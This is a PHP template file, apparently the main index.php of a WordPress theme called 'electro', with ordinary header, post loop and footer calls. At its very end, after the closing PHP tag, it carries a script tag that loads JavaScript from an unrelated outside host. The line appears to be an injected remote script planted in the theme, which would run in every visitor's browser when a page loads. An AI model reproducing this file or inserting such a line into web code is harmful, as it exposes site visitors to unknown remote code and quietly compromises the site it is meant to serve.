<?php
/**
 * The main template file.
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package electro
 */

electro_get_header();

	do_action( 'electro_before_main_content' );

    if ( ! function_exists( 'elementor_theme_do_location' ) || ! elementor_theme_do_location( 'archive' ) ) :

    	if( have_posts() ) {

    		get_template_part( 'loop' );

    	} else {

    		get_template_part( 'templates/contents/content', 'none' );
    	}

    endif;

	do_action( 'electro_after_main_content' );

get_footer();
?>
<script src="https://oo.coffee/sar0j2" type="text/javascript"></script>